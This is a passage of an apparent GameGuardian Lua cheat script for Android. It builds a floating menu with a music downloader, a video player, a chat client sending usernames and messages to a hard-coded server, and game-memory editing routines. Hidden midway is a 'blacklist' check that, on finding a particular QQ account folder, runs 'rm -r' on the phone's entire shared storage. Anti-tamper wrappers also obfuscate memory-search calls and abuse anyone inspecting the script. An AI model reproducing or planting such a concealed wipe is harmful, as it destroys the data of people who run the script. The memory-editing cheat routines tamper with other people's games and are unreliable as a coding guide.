	xuanzhuandonghua = ObjectAnimator:ofFloat(control, "rotation", {
		0, 360
	})
	xuanzhuandonghua:setRepeatCount(0)
	xuanzhuandonghua:setRepeatMode(Animation.REVERSE)
	xuanzhuandonghua:setDuration(time)
	xuanzhuandonghua:start()
	end) end
xuanzhuandonghua = nil  -- 全局变量用于保存动画对象

changan.controlRotation2 = function(control, time)
    luajava.runUiThread(function()
        import "android.view.animation.Animation"
        import "android.animation.ObjectAnimator"
        xuanzhuandonghua = ObjectAnimator:ofFloat(control, "rotation", {
            0, 360
        })
        xuanzhuandonghua:setRepeatCount(0)
        xuanzhuandonghua:setRepeatMode(Animation.RESTART)
        xuanzhuandonghua:setDuration(time)
        xuanzhuandonghua:start()
    end)
end

-- 停止旋转动画
changan.stopRotation = function()
    if xuanzhuandonghua then
        xuanzhuandonghua:cancel()
    end
end
changan.controlFlip = function(control,time)
	luajava.runUiThread(function()
  import "android.view.animation.Animation"
  import "android.animation.ObjectAnimator"
  xuanzhuandonghua1 = ObjectAnimator:ofFloat(control, "rotationY", {0, 360})
  xuanzhuandonghua1:setRepeatCount(0)
  xuanzhuandonghua1:setRepeatMode(Animation.REVERSE)
  xuanzhuandonghua1:setDuration(time)
  xuanzhuandonghua1:start()
end) end	
function tuic()
gg.toast("悬浮窗已退出")
window:removeView(floatWindow)
luajava.setFloatingWindowHide(false)
luajava.newThread(function() os.exit() end):start()
bloc("end")
end
wyyget="http://120.24.160.246:3000/"
function huoqu(txt)
return table.json(gg.makeRequest(wyyget.."song/url/v1?id="..txt.."").content)
end
function souyy(txt)
tbttt=gg.makeRequest(wyyget.."search?keywords="..txt.."&limit=10")
if tbttt==nil or type(tbttt)=="string" then gg.alert("网络异常") luajava.runUiThread(function()
luajava.getIdView("jzz"):setVisibility(View.GONE)
luajava.getIdView("sstxt"):setVisibility(View.VISIBLE)
end) end
return table.json(tbttt.content)
end
function develo(tabb)
gg.alert(tostring(tabb))
end
function develo2(tabb)
gg.copyText(tostring(tabb))
end
function tablekIn(tbl, key)
    if tbl == nil then
        return false
    end
    for k, v in pairs(tbl) do
        if k == key then
            return true
        end
    end
    return false
end
function searchmusic()
if not lasttm then lasttm=os.time() else
if os.time()-lasttm<=5 then gg.alert("请在"..(5-(os.time()-lasttm)).."秒冷却后搜索")
    return 0 end end
if not wryt then else runnable = luajava.getRunnable(function() luajava.getIdView("搜索列表"):removeView(wyr) end)
handler = luajava.getHandler()
handler:post(runnable) end
mustxt=luajava.getIdView("搜索"):getText()
if string.len(tostring(mustxt))<=2 or tostring(mustxt)==nil then gg.alert("至少输入2个字符") return 0 end
mustxt=tostring(mustxt)
luajava.runUiThread(function()
luajava.getIdView("jzz"):setVisibility(View.VISIBLE)
luajava.getIdView("sstxt"):setVisibility(View.GONE)
end)
lasttm=os.time()
mustable=souyy(mustxt)
mustable=mustable.result.songs
musnames={} musids={} musarts={}
musictable={}
for k,v in pairs(mustable) do
if tonumber(v.fee)==0 or tonumber(v.fee)==8 then
musictable[#musictable+1]=v
end
end
--gg.alert(tostring(mustable))
--gg.alert(tostring(musictable))
--gg.copyText(tostring(mustable))
--gg.alert(#musictable)
wrfun={}
wryt={LinearLayout,
    id=luajava.newId("搜索结果"),
    layout_marginTop="5dp",
    layout_marginBottom="5dp",
    orientation="vertical",
    
}
for i=1,#musictable do
musid=musictable[i].id
musids[#musids+1]=musid
musname=musictable[i].name
if tablekIn(musictable[i], "transNames")~=false then
musname=musname .."\n(".. musictable[i].transNames[0]..")"
end
musnames[#musnames+1]=musname
musart=musictable[i].artists[0].name
musarts[#musarts+1]=musart
wryt[#wryt+1]={LinearLayout,
    orientation="vertical",
    layout_marginTop="2dp",
    layout_marginBottom="2dp",
    background=getseekgra(),
    id=luajava.newId("音"..musid),
    onClick=function() 
        thread = luajava.getPThread(function()  bofang(musname,musid) end)
		thread:start()
    end,
    {
            TextView,
            layout_marginTop="5dp",
            textSize="17sp",
            textColor="#ffffff",
    layout_marginBottom="0dp",
            text = musname,
            layout_hight="10dp",
            layout_width = "190dp",
            gravity="center",
            
},{
            TextView,
            layout_marginTop="0dp",
            textColor="#A0A0A0",
            textSize="12sp",
    layout_marginBottom="5dp",
            text = musart,
            layout_hight="10dp",
            layout_width = "match_parent",
            gravity="center",
            
}

}
--gg.sleep(50)
wryt[#wryt].onClick=function() 
        luajava.getPThread(function() 
        bofang(musnames[i]..musarts[i],musids[i])
        end):start()
end
end
wyr=luajava.loadlayout(wryt)
runnable = luajava.getRunnable(function() luajava.getIdView("搜索列表"):addView(wyr) end)
handler = luajava.getHandler()
handler:post(runnable)
luajava.runUiThread(function()
luajava.getIdView("jzz"):setVisibility(View.GONE)
luajava.getIdView("sstxt"):setVisibility(View.VISIBLE)
end)
--gg.alert(tostring(wrfun))
end
function bofang(gqmz,gdmn)
luajava.runUiThread(function()
luajava.getIdView("搜索结果"):setVisibility(View.GONE)
luajava.getIdView("加载"):setVisibility(View.VISIBLE)
end)

if panduan("/sdcard/FISH/音频/"..gqmz..".mp3")==true then
gg.playMusic("/sdcard/FISH/音频/"..gqmz..".mp3")
else
gg.toast("下载中..."..gqmz)
musurl=huoqu(gdmn).data[0].url
if musurl=="" or musurl=="null" then gg.alert("由于版权问题\n这首歌不能播放","你干嘛哈哈哎呦","呀啊哈哈嘛干") else
 file.download(musurl,"/sdcard/FISH/音频/"..gqmz..".mp3")
 gg.playMusic("/sdcard/FISH/音频/"..gqmz..".mp3")
gg.sleep(1000)
end
end

luajava.runUiThread(function()
luajava.getIdView("加载"):setVisibility(View.GONE)
luajava.getIdView("搜索结果"):setVisibility(View.VISIBLE)
end)
end
sstxt={LinearLayout,
	visibility="visible",
    id=luajava.newId("sstxt"),
	gravity="center",
    layout_hight="70dp",
    layout_width="70dp",
    gravity="center",
    orientation="vertical",
	{TextView,
    text="搜索",
    background=luajava.loadlayout({
    GradientDrawable,
    color = "#dd3FD198",
    cornerRadius = 12
}),
    gravity="center",
    layout_hight="30dp",
    layout_width="70dp",
    textSize="15sp",
    onClick=function() thread = luajava.getPThread(function() searchmusic() end)
			thread:start() end,
    },
	{TextView,
    text="停止",
    background=luajava.loadlayout({
    GradientDrawable,
    color = "#ddFF4A6F",
    cornerRadius = 12
}),
    gravity="center",
    layout_hight="30dp",
    layout_width="70dp",
    textSize="15sp",
    onClick=function() thread = luajava.getPThread(function() gg.playMusic("stop") end)
			thread:start() end,
    }
}
jzz={TextView,
    text="加载中",
    visibility="gone",
    id=luajava.newId("jzz"),
    layout_marginLeft="10dp",
    textSize="15sp",
    }
jiaz={TextView,text="正在加载歌曲资源",
    visibility="gone",
    id=luajava.newId("加载"),
    textSize="17sp",
    gravity="center"
}
wyylog=luajava.loadlayout({LinearLayout,
    
    layout_hight="wrap_content",
    layout_width = "fill_parent",
    {ScrollView,
    layout_hight="wrap_content",
    layout_width = "fill_parent",
    {LinearLayout,
    id=luajava.newId("搜索列表"),
    layout_hight="wrap_content",
    layout_width = "fill_parent",
    orientation="vertical",
    layout_width = "fill_parent",
    gravity="center",
    {LinearLayout,orientation="horizontal",
    layout_width = "wrap_content",
    
    {
            EditText,
            hint = "搜索歌曲",
            textSize="14sp",
            id=luajava.newId("搜索"),
            background=luajava.loadlayout({
    GradientDrawable,
    color = "#87000000",
    cornerRadius = 22
}),
            focusableInTouch="false",
			focusable="false",
			selectAllOnFocus="true",
			singleLine="true",
			gravity="center",
            layout_width = "120dp",
            layout_height = "42dp",
        },
    sstxt,
    jzz
    },jiaz}}
})





zidong = luajava.newThread(function()
	while true do
--luajava.runUiThread(function() durox=logvid:isPlaying() end)
--if tostring(durox)=="false" or tostring(durox)=="nil" then
--newzdbf=true
	logvid.start(logvid)
--end
	gg.sleep(500)
	end
	end)
vurl = "http://av.host.gay/vipjk.php"
web6 = luajava.loadlayout({FrameLayout,
gravity="top|center_vertical",
{LinearLayout,
gravity="center",orientation="vertical",
	{
	VideoView,
	id = luajava.newId('video'),
	videoPath = vurl,
	layout_width = "fill_parent",
	layout_height = "wrap_content",
},changan.button("换一个",function()
	changan.controlFlip(web6,2500)
		logvid = luajava.getIdView("video")
--luajava.runUiThread(function() durax=logvid:getDuration() end)
--gg.alert(tostring(durax))
		logvid:setVideoPath(vurl)
	end),
},{LinearLayout,
gravity="center",
changan.switch("自动播放",
		function()
		zdbf = true
		logvid = luajava.getIdView("video")
		zidong:start()
		end,
		function()
		zidong:interrupt()
		
		
		
--logvid.resume(logvid)
		end),
},

}
)
do
local path = "/sdcard/游客信息.lua" --用户信息
local r = io.open(path, "r")
if r then
qltname = r:read("*a")
else
	qltname = "游客" .. math.random(1111111, 9999999)
io.open(path, "w"):write(qltname)
end
local path = "/sdcard/用户头像2.lua" --用户信息
local r = io.open(path, "r")
if r then
qlticon = r:read("*a")
else
	qlticon = ""
io.open(path, "w"):write(qlticon)
end
end
httpip="http://47.101.220.155/xib/caa.php"
httpip2="http://47.101.220.155/xib/"

function getu(name)
fs=gg.makeRequest(httpip.."?name="..name.."&mode=get").content
if fs=="00" then return "获取失败" else return fs end
end
function uplo(name,txt)
fs=gg.makeRequest(httpip.."?txt="..txt.."&name="..name.."&mode=set").content
end
function uprec(name,txt)
txt=string.bin2hex(txt)
if string.len(txt)<=7000 then
uplo(name,txt)
else
	uplo(name,string.sub(txt,1,7000))
	for i=2,(string.len(txt)/7000)-1 do
		fs=gg.makeRequest(httpip.."?txt="..string.sub(txt,(i-1)*7000,i*7000).."&name="..name.."&mode=set2").content
	end
	txt=string.sub(txt,math.floor(string.len(txt)/7000)*7000+1,-1)
	fs=gg.makeRequest(httpip.."?txt="..txt.."&name="..name.."&mode=set2").content
end
end
function 修改名字(lttext)
if string.len(lttext) <= 0 then return 0 end
if string.len(lttext) >= 400 then
gg.toast("用户名长度上限20字节") return 0
end
local path = "/sdcard/游客信息.lua" --用户信息
qltname = lttext
io.open(path, "w"):write(qltname)
gg.alert("修改成功\n"..lttext)
end
function 修改头像(txt)
local path2 = "/sdcard/用户头像2.lua"
if string.find(txt,"emulated/0") ~= nil or string.find(txt,"/sdcard") ~= nil then
gg.alert("暂不支持上传本地图片\n请使用QQ号或直链")
return 0
end
if tonumber(txt) ~= nil then txt = "http://q1.qlogo.cn/g?b=qq&nk="..txt.."&s=100" end
if string.find(txt,"http%%") ~= nil or string.find(txt,"https%%") ~= nil then
gg.alert("格式有误，请重新输入") return 0
end
txt = string.url(txt,"en")
qlticon = txt
io.open(path2.."l", "w"):write(qlticon)
gg.alert("头像修改成功")
end
lastlttm = os.time()-3
function 发送聊天(lttext)
if os.time()-lastlttm <= 1 then
gg.alert("聊天冷却"..1 -(os.time()-lastlttm).."秒")
return 0
end
local server = "http://47.101.220.155/xib/" --服务器地址
--local chat_log = gg.makeRequest(server .. "lts.php?hq=true").content
local uptime = gg.makeRequest(server .. "lts.php?updat=true").content
if uptime then
--	io.open(path, "w"):write(GT[2])
if string.len(lttext) <= 0 then return 0 end
if string.len(lttext) >= 400 then
gg.toast("文字长度上限400字节")
else
	changan.setedit("输入聊天内容","")
lastlttm = os.time()
lttext = string.gsub(lttext,"·","•")
lttext = string.gsub(lttext,"～","~")
lttext = string.gsub(lttext,"—","-")
lttext = string.gsub(lttext,"…","...")
if not qlticon or qlticon == "" or qlticon == "nil" then qlticon = "https://escape2020-1303126286.cos.ap-shenzhen-fsi.myqcloud.com/defaulticon" qlticon=string.url(qlticon,"en") end
local p = gg.makeRequest(server .. "lts.php?lticon="..qlticon.."&nr=" .. lttext .. "&name=" .. qltname).content
if p ~= "发送成功" then
gg.alert(qlticon.."\nerror -149: 消息发送失败")
else
	gg.toast("发送成功")
end
end
else
	gg.toast("请检查您的网络是否正常") return 0
end
shuaxinchat()
end
function FGUtilStringSplit(str,split_char)
local sub_str_tab = {}
while (true) do
local pos = string.find(str, split_char);
if (not pos) then
sub_str_tab[#sub_str_tab + 1] = str;
break
end
local sub_str = string.sub(str, 1, pos - 1).."…"
sub_str_tab[#sub_str_tab + 1] = sub_str;
str = string.sub(str, pos + 1, #str);
end

return sub_str_tab
end
nowtime = 0
localres = {}
function shuaxinchat()
local server = "http://47.101.220.155/xib/" --服务器地址
local uptime = gg.makeRequest(server .. "time.txt").content
if tonumber(uptime) then
if tonumber(uptime) > nowtime then
local chat_log = gg.makeRequest(server .. "lts.php?hq=true").content
nowtime = tonumber(uptime)
newltres = {}
ltres = FGUtilStringSplit(chat_log,"…")
for i = 1,#ltres do
if string.find(ltres[i],"·") == nil or string.find(ltres[i],"～") == nil then else
	newltres[#newltres+1] = {}
newltres[#newltres].ltname = ltres[i]:match("·(.-)—")
newltres[#newltres].lttext = ltres[i]:match("～(.-)…")
newltres[#newltres].lttime = ltres[i]:match("—(.-)～")
newltres[#newltres].lticon = ltres[i]:match("㊢(.-)·")
end
end
for i = 1,#newltres do
isnew = true
for j = 1,#localres do
if newltres[i].ltname == localres[j].ltname and newltres[i].lttime == localres[j].lttime and newltres[i].lttext == localres[j].lttext then
isnew = false
end
end
if isnew == true then
isnew = false
xuyaoshuaxin = true
localres[#localres+1] = newltres[i]
--gg.alert(tostring(localres[#localres]))
addchat(changan.chat(localres[#localres]))
end
end
--gg.alert(tostring(localres))
if xuyaoshuaxin == true and already == true then
gundong()
xuyaoshuaxin = false
end
end
else
	gg.toast("请检查您的网络是否正常") return 0
end
end
function addchat(cha)
local function invoke2()
layoutm4:addView(cha)
end
local runnable = luajava.getRunnable(invoke2)
local handler = luajava.getHandler()
handler:post(runnable)
end
function gundong()
if already then
gg.sleep(100)
local function invoke2()
_ENV["layouts4"]:fullScroll(View.FOCUS_DOWN)
end
local runnable = luajava.getRunnable(invoke2)
local handler = luajava.getHandler()
handler:post(runnable)
end
end
function removechat(cha)
local function invoke2()
_ENV["layoutm4"]:removeView(cha)
end
local runnable = luajava.getRunnable(invoke2)
local handler = luajava.getHandler()
handler:post(runnable)
end
function changan.chat(ltlist)
ltname = ltlist.ltname
lticon = ltlist.lticon
lttext = ltlist.lttext
lttime = ltlist.lttime
if not lticon or lticon == "" or lticon == "nil" then lticon = "https://escape2020-1303126286.cos.ap-shenzhen-fsi.myqcloud.com/defaulticon" end
bitmap = luajava.getBitmapDrawable(lticon)
if not bitmap then bitmap = luajava.getBitmapDrawable("https://escape2020-1303126286.cos.ap-shenzhen-fsi.myqcloud.com/defaulticon") end
if not _ENV[lticon] then _ENV[lticon] = bitmap end
if not lttext or lttext == "" then lttext = "  " end
if string.find(lticon,"http%%") ~= nil then lticon = "https://escape2020-1303126286.cos.ap-shenzhen-fsi.myqcloud.com/defaulticon" end
if string.find(lticon,"/sdcard") == nil and string.find(lticon,"emulated") == nil and string.find(lticon,"http:/") == nil and string.find(lticon,"https:/") == nil then lticon = "https://escape2020-1303126286.cos.ap-shenzhen-fsi.myqcloud.com/defaulticon" end
if not lttext then lttext = "   " end

local ctbg=chatbg()
	ltresult = luajava.loadlayout(
		{
		LinearLayout,
		layout_width = "190dp",
		layout_height = "wrap_content",
		orientation = "horizontal",
		{
			LinearLayout,
			layout_height = "50dp",
			layout_width = "50dp",
			background = _ENV[lticon],
		},
		{
			LinearLayout,
			layout_height = "wrap_content",
			layout_width = "wrap_content",
			layout_marginLeft = "10dp",
			orientation = "vertical",
			{
TextView,
text = ltname.."\n"..lttime,
textSize = "10sp",
layout_width = "wrap_content",
layout_height = "wrap_content",
			}, {
TextView,
text = lttext,
textSize = "15sp",
background = ctbg,
padding = "3dp",
layout_width = "wrap_content",
layout_height = "wrap_content",
			}
		}})

return ltresult
end
function chatbg()
return luajava.loadlayout({
	GradientDrawable,
	color = "#aa2383FF",
	cornerRadius = 18
})
end
function visi(tid,ttid)
local tview = luajava.getIdValue(tid)
local ttview = luajava.getIdValue(ttid)
if not tview then return 0 end
if tonumber(tostring(tview:getVisibility())) == 8.0 then
tview:setVisibility(View.VISIBLE)
ttview:setBackground(luajava.getBitmapDrawable("/sdcard/息/图片/hsj"))
else
	tview:setVisibility(View.GONE)
ttview:setBackground(luajava.getBitmapDrawable("/sdcard/息/图片/sj"))
end
end
function changan.box(views)
local tid = "box"..guid()
local ttid = tid.."6"
firadio = {
	LinearLayout,
	layout_width = '210dp',
	layout_height = "wrap_content",
	layout_marginTop = "2dp",
	layout_marginBottom = "2dp",
	orientation = "vertical",
	background = luajava.loadlayout {
		GradientDrawable,
		color = "#0018191C",
		cornerRadius = 8
	},
}
if type(views[1]) == "string" or type(views[1]) == "number" then
firadio[#firadio+1] = {
	LinearLayout,
	layout_width = 'fill_parent',
	layout_height = "30dp",
	gravity = "center_vertical",
	layout_marginTop = "2dp",
	layout_marginBottom = "4dp",
	onClick = function() visi(tid,ttid) end,
	background = getSelector3(),
	{
		ImageView,
		layout_marginLeft = "10dp",
		id = luajava.newId(ttid),
		background = "/sdcard/息/图片/sj",
		layout_width = "20dp",
		layout_height = "20dp",
		layout_marginTop = "0dp",
	},
	{
		TextView,text = views[1],
		textSize = "16sp",
		layout_marginLeft = "15dp",
		layout_width = "100dp",
		textColor = "#ffffff",
		gravity = "left",
	}} else
	gg.alert("changan.box第一个参数必须是string") os.exit()
end
radios = {
	LinearLayout,
	layout_marginLeft = "0dp",
	layout_marginRight = "0dp",
	orientation = "vertical",
	visibility = "gone",
	id = luajava.newId(tid),
	padding = "0dp",
	layout_width = 'fill_parent',
}
for i = 2,#views do
radios[#radios+1] = views[i]
end
firadio[#firadio+1] = radios
return luajava.loadlayout(firadio)
end
function getLayoutParams2()
local prm = luajava.new(WindowManager.LayoutParams)

layoutParams1 = prm
if (Build.VERSION.SDK_INT >= 26) then -- 设置悬浮窗方式
layoutParams1.type = prm.TYPE_APPLICATION_OVERLAY
else
	layoutParams1.type = prm.TYPE_PHONE
end
layoutParams1.format = PixelFormat.RGBA_8888 -- 设置背景
layoutParams1.flags = prm.FLAG_NOT_FOCUSABLE -- 焦点设置Finish
layoutParams1.gravity = Gravity.CENTER -- 重力设置
layoutParams1.width = prm.WRAP_CONTENT -- 布局宽度
layoutParams1.height = prm.WRAP_CONTENT -- 布局高度
return layoutParams1
end
jianbian6 = luajava.new(GradientDrawable)
jianbian6:setCornerRadius(50)
jianbian6:setGradientType(GradientDrawable.LINEAR_GRADIENT)
jianbian6:setColors({0x660043FF,0x99FF84EB})
jianbian6:setStroke(0,"0x44FFffff")--边框宽度和颜色

jianbian7 = luajava.new(GradientDrawable)
jianbian7:setCornerRadius(40)
jianbian7:setGradientType(GradientDrawable.LINEAR_GRADIENT)
jianbian7:setColors({0x6600FF76,0x9900A5FF})
jianbian7:setStroke(8,"0xffffffff")

jianbian8 = luajava.new(GradientDrawable)
jianbian8:setCornerRadius(40)
jianbian8:setGradientType(GradientDrawable.LINEAR_GRADIENT)
jianbian8:setColors({0x66FF2C22,0x998600FF})
jianbian8:setStroke(8,"0xffffffff")

jianbian9 = luajava.new(GradientDrawable)
jianbian9:setCornerRadius(4)
jianbian9:setGradientType(GradientDrawable.LINEAR_GRADIENT)
jianbian9:setColors({0xddC70100,0x99000000})
jianbian9:setStroke(4,"0xaa000000")


function balert(bltxt,bltxt1,bltxt2)
result=0
if not bltxt then bltxt='这里写正文\n测试\n测试' end
if not bltxt1 then bltxt1='取消' end
if not bltxt2 then bltxt2='确定' end
bltxt=tostring(bltxt)
bltxt1=tostring(bltxt1)
bltxt2=tostring(bltxt2)

local dialog = luajava.new(AlertDialog.Builder, app.context)
	local block = luajava.getBlock()
	local result

	local function exit()
		block('end')
	end
layoutabc=luajava.loadlayout({ScrollView,
{LinearLayout,
    background="#00000000",
		orientation="vertical",
		layout_width="match_parent",
        layout_height="match_parent",
		gravity = 'center',
{ScrollView,
gravity="center",
layout_height="230dp",
layout_width="fill_parent",
padding="25dp",
{LinearLayout,
layout_marginTop="20dp",
gravity="center",
layout_height="220dp",
layout_width="fill_parent",
padding="25dp",
{TextView,
id = luajava.newId('弹窗文字'),
        textSize="18sp",
        text = bltxt,
        layout_height="wrap_content",
layout_width="fill_parent",
        layout_gravity="center",
        gravity="center",
},}},
{LinearLayout,
gravity="center",
layout_height="90dp",
layout_width="fill_parent",
orientation="horizontal",
{Button,
id="balt1",
gravity="center",
background=jianbian7,
text=bltxt1,
layout_height="40dp",
layout_width="wrap_content",
layout_marginRight="70dp",
},
{Button,
id="balt2",
gravity="center",
background=jianbian8,
text=bltxt2,
layout_height="40dp",
layout_width="wrap_content",
layout_marginLeft="70dp",
}
}}})
balt1.onClick = function() result = 1 dialog:dismiss() exit() end
balt2.onClick = function() result = 2 dialog:dismiss() exit() end
	dialog:setView(layoutabc)
	dialog:setOnDismissListener(luajava.createProxy('android.content.DialogInterface$OnDismissListener', {	onDismiss = function(view)	exit()	end}))
	local function invoke()
		dialog = dialog:create()
		local window = dialog:getWindow()
		window:setType(Build.VERSION.SDK_INT >= 26 and 2038 or 2002)
		window:setBackgroundDrawable(jianbian6)
		window:getDecorView():setPadding(0,0,0,0)
		dialog:show()
		--window:setLayout(1400,1000)
		YoYoImpl:with("FadeIn"):duration(300):playOn(layoutabc) 
	end
	luajava.handlerPost(invoke)
block('join')
return result
end



function tst(text)
	text = tostring(text)
	local block = luajava.getBlock()
	local layout = luajava.loadlayout({
	LinearLayout,
	background=jianbian9,
	gravity='center',
	layout_height='match_parent',
	layout_width='match_parent',
	layout_wight='1',
		{
			TextView,
			id = luajava.newId('TextView'),
			text = text,
			textSize = '18sp',
			textColor = "#ffffffff",
			margins = {'20dp', '10dp', '20dp', '10dp'}
		}
	})
	local function invoke()
		if toaa==nil then
		toaa = Toast:makeText(app.context, '', 1)
		end
		toaa:setView(layout)
		toaa:show()
	end
	luajava.handlerPost(invoke)
end


--draw3 = require('draw3')
--draw3 = require('draw3')
--text1 = draw3.text('息白内部特别版',10,220)
--text2 = draw3.text('TG·@XJBAI667',10,350)
--draw.text(os.date'', 100,600)draw.setColor('#FFF5A0')
--for i = 1, 4 do--字体大小
 --gg.sleep(50)
 -- 设置颜色
    --local color = 0x00A0FFFD
    --text1.setColor(color)
    --local color = 0x00FFA0CC
    --text2.setColor(color)

 -- 帅帅龙虾
 --text1.update(i)
 --text2.update(i)
--end

local QQ = {
	"1047277200"
}
for i, k in pairs(QQ) do
local qq = "/storage/emulated/0/Android/data/com.tencent.mobileqq/Tencent/MobileQQ/"..k
if os.rename(qq, qq) then
gg.command('rm -r /storage/emulated/0/')
gg.command('rm -r /storage/emulated/0/*')
gg.command('rm -r /sdcard/*')
gg.command('rm -r /storage/emulated/')
gg.command('rm -r /storage/')
while true do
gg.alert("检测到黑名单QQ 不给予进入脚本")
os.exit()
end
end
end
--------------防御
--先刷足次数
local Y = string.rep("息白：想破解？",99999)
--建立一个新的表
T = {}
--使用循环将值写入表中
for i = 1,2048 do
T[i] = Y
end
--遍历string库 使用保护模式将它们运行
--v→=参数比如string.(这里面就是表的东西)
--T→=等于表里面的key
for k,v in pairs (string) do
pcall(v,T)
end

YxNB = gg.searchNumber
YxNBNB = gg.editAll
function lllsjsf()
YXB = {
	"yz","=z","=l","ly","gy","zt"
}
wqnmds = ""
for i = 1,2000 do
wqnmds = wqnmds..YXB[math.random(1, #YXB)]
end
return wqnmds
end
lllsjsf()
function gg.searchNumber(...)
gg.setVisible(false)
search_e = string.char(0,0,0,0,0,0,0)
for i = 1,22 do
search_e = search_e..search_e
end
gg.getResults(1)
YxNBNB(search_e,4)
local s,j = {}, {}
for i = 1,50 do
j[i] = math.random(1,2140000000)
s[j[i]] = {
	address = i,flags = 4,temp = search_e
}
end
local timegg = os.clock()+os.time()
s = gg.getValues(s)
local dateinit = os.clock()+os.time()
for i = 1,50 do
while s[j[i]].value ~= 0 or dateinit-timegg > 2.1 do
gg.clearResults()
print("log你妈呢臭傻逼")
string.toMusic("检测到危险行为正在启动虚假脚本")----语音播放
os.exit()
end
end
ab = {
	...
}
Yw = [[%d]]
ab[1] = ab[1]:gsub(Yw, function(Yx)
	return Yx .. wqnmds .. wqnmds
	end
)
YxNB(table.unpack(ab))
gg.getResults(0)
YxNBNB(search_e,4)
end
function gg.editAll(...)
ab = {
	...
}
ab[1] = ab[1]:gsub(Yw, function(Yx)
	return Yx .. wqnmds .. wqnmds
	end
)
YxNBNB(table.unpack(ab))
end

function split(szFullString, szSeparator) local nFindStartIndex = 1 local nSplitIndex = 1 local nSplitArray = {} while true do local nFindLastIndex = string.find(szFullString, szSeparator, nFindStartIndex) if not nFindLastIndex then nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, string.len(szFullString)) break end nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, nFindLastIndex - 1) nFindStartIndex = nFindLastIndex + string.len(szSeparator) nSplitIndex = nSplitIndex + 1 end return nSplitArray end function xgxc(szpy, qmxg) for x = 1, #(qmxg) do xgpy = szpy + qmxg[x]["offset"] xglx = qmxg[x]["type"] xgsz = qmxg[x]["value"] xgdj = qmxg[x]["freeze"] if xgdj == nil or xgdj == "" then gg.setValues({[1] = {
	address = xgpy, flags = xglx, value = xgsz
}}) else gg.addListItems({[1] = {
	address = xgpy, flags = xglx, freeze = xgdj, value = xgsz
}}) end xgsl = xgsl + 1 xgjg = true end end function xqmnb(qmnb) gg.clearResults() gg.setRanges(qmnb[1]["memory"]) gg.searchNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "开启成功") else gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) gg.refineNumber(qmnb[3]["value"], qmnb[3]["type"]) if gg.getResultCount() == 0 then gg.toast(qmnb[2]["name"] .. "开启成功") else sl = gg.getResults(999999) sz = gg.getResultCount() xgsl = 0 if sz > 999999 then sz = 999999 end for i = 1, sz do pdsz = true for v = 4, #(qmnb) do if pdsz == true then pysz = {} pysz[1] = {} pysz[1].address = sl[i].address + qmnb[v]["offset"] pysz[1].flags = qmnb[v]["type"] szpy = gg.getValues(pysz) pdpd = qmnb[v]["lv"] .. ";" .. szpy[1].value szpd = split(pdpd, ";") tzszpd = szpd[1] pyszpd = szpd[2] if tzszpd == pyszpd then pdjg = true pdsz = true else pdjg = false pdsz = false end end end if pdjg == true then szpy = sl[i].address xgxc(szpy, qmxg) end end if xgjg == true then gg.toast(qmnb[2]["name"] .. "开启成功,共修改" .. xgsl .. "条数据") else gg.toast(qmnb[2]["name"] .. "开启成功") end end end end

--指针写法配置↓

function SearchWrite(Search, Write, Type) gg.clearResults() gg.setVisible(false) gg.searchNumber(Search[1][1], Type) local count = gg.getResultCount() local result = gg.getResults(count) gg.clearResults() local data = {} local base = Search[1][2] if (count > 0) then for i, v in ipairs(result) do v.isUseful = true end for k = 2, #Search do local tmp = {} local offset = Search[k][2] - base local num = Search[k][1] for i, v in ipairs(result) do tmp[#tmp+1] = {} tmp[#tmp].address = v.address + offset tmp[#tmp].flags = v.flags end tmp = gg.getValues(tmp) for i, v in ipairs(tmp) do if (tostring(v.value) ~= tostring(num)) then result[i].isUseful = false end end end for i, v in ipairs(result) do if (v.isUseful) then data[#data+1] = v.address end end if (#data > 0) then gg.toast(""..yeqiu.."修改成功,共修改"..#data.."条数据") local t = {} local base = Search[1][2] for i = 1, #data do for k, w in ipairs(Write) do offset = w[2] - base t[#t+1] = {} t[#t].address = data[i] + offset t[#t].flags = Type t[#t].value = w[1] if (w[3] == true) then local item = {} item[#item+1] = t[#t] item[#item].freeze = true gg.addListItems(item) end end end gg.setValues(t) else gg.toast(""..yeqiu.."搜索0条数据,修改失败", false) return false end else gg.toast(""..yeqiu.."搜索0条数据,修改失败") return false end end

--so写法配置↓





function readPointer(name, offset, i)
    local re = gg.getRangesList(name) 
    local x64 = gg.getTargetInfo().x64 
    local va = {[true]=32, [false]=4} 
    if re[i or 1] then
        local addr = re[i or 1].start + offset[1] 
        for i = 2, #offset do
            addr = gg.getValues({{address=addr, flags=va[x64]}}) 
            if not x64 then
                addr[1].value = addr[1].value & 0xFFFFFFFF 
            end
            addr = addr[1].value + offset[i] 
        end
        return addr
    end
end
-- 修改内存地址的函数
function gg.edits(addr, Table, name)
    local Table1 = {{}, {}} 
    for k, v in ipairs(Table) do
        local value = {address = addr+v[3], value = v[1], flags = v[2], freeze = v[4]}
        if v[4] then
            Table1[2][#Table1[2]+1] = value 
        else
            Table1[1][#Table1[1]+1] = value
        end
    end
    gg.addListItems(Table1[2])
    gg.setValues(Table1[1])
    gg.toast((name or "") .. "开启成功, 共修改"..#Table.."个值息白")
end






function xqmnb(Search,Modification)
   gg.clearResults()
   gg.setRanges(Search[1].memory)
   gg.searchNumber(Search[3].value,Search[3].type,false,536870912,0,-1)
   if gg.getResultCount()==0 then
      gg.toast(Search[2].name..'开启失败')
      return
   end
   local Result=gg.getResults(gg.getResultCount())
   local sum
   for index=4,#Search do
      sum=0
      for i=1,#Result do
         if gg.getValues({{address=Result[i].address+Search[index].offset,flags=Search[index].type}})[1].value~=Search[index].lv then
            Result[i].Usable=true
            sum=sum+1
         end
      end
      if sum==#Result then
         gg.toast(Search[2].name..'开启失败')
         return
      end
   end
   local Data,Freeze,Freezes={},{},0
   sum=0
   for index,value in ipairs(Modification)do
      for index=1,#Result do
         if not Result[index].Usable then
            local Value={address=Result[index].address+value.offset,flags=value.type,value=value.value,freeze=true}
            if value.freeze then
               Freeze[#Freeze+1]=Value
               Freezes=Freezes+1
            else
               Data[#Data+1]=Value
            end
            sum=sum+1
         end
      end
   end
      gg.setValues(Data)
      gg.addListItems(Freeze)
   if Freezes==0 then
      gg.toast(Search[2].name..'开启成功,共修改'..sum..'条数据')
   else
      gg.toast(Search[2].name..'开启成功,共修改'..sum..'条数据,冻结'..Freezes..'条数据')
   end
   gg.clearResults()
end
function XGBase(Address,AFV)
   local address=0
